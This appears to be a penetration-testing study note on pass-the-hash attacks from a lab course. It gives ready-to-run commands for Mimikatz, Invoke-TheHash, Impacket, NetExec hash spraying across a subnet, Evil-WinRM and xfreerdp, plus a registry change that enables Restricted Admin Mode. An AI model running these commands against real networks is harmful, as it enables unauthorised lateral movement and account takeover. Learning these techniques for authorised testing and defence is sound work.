- Pass the Hash (PtH): use the NTLM hash itself to authenticate, don't need the plaintext password
- Works because NTLM auth never actually needs the plaintext, the hash alone proves identity (this is also why hashes aren't "salted" the same way Linux ones are)
- Where the hash comes from: [[02 - Attacking SAM]] (local), [[06 - Attacking Active Directory and NTDS]] (domain), [[03 - Attacking LSASS]] (memory)

## From Windows
**Mimikatz**
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<hash> /domain:inlanefreight.htb /run:cmd.exe" exit
```
- Opens a new cmd.exe running AS that user, from there we can hit shares/services normally

**Invoke-TheHash** (PowerShell, SMB or WMI, don't need local admin on our own machine, just need the hash to have admin rights on the TARGET)
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <ip> -Domain inlanefreight.htb -Username julio -Hash <hash> -Command "whoami"
Invoke-WMIExec -Target <ip> -Domain inlanefreight.htb -Username julio -Hash <hash> -Command "<base64 reverse shell>"
```

---
## From Linux
**Impacket (psexec, wmiexec, etc)**
```bash
impacket-psexec administrator@<ip> -hashes :<nthash>
```
- See [[Impacket Command Execution]] for the other impacket exec tools

**NetExec** - good for checking a hash against MANY hosts at once (local admin password reuse is very common across a subnet, orgs often use the same gold image)
```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>

# Example Output
SMB 172.16.1.5 445 MS01 [+] .\Administrator <hash> (Pwn3d!)
```

- `(Pwn3d!)` = this host accepted the hash with admin rights
- Add `--local-auth` to only try the LOCAL account on each host (1 attempt per host, avoids lockouts) instead of spraying as a domain account
- `-x whoami` to run a command directly once it confirms access

**Evil-WinRM**
```bash
evil-winrm -i <ip> -u Administrator -H <hash>
```

**RDP (xfreerdp)** - needs "Restricted Admin Mode" enabled on target first
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```bash
xfreerdp /v:<ip> /u:julio /pth:<hash>
```

## Gotcha
- PtH to a LOCAL admin account (not domain) can get blocked by UAC remote restrictions, only the built-in RID 500 "Administrator" account is normally exempt from this
- Doesn't affect domain accounts with admin rights on the box, this only applies to local accounts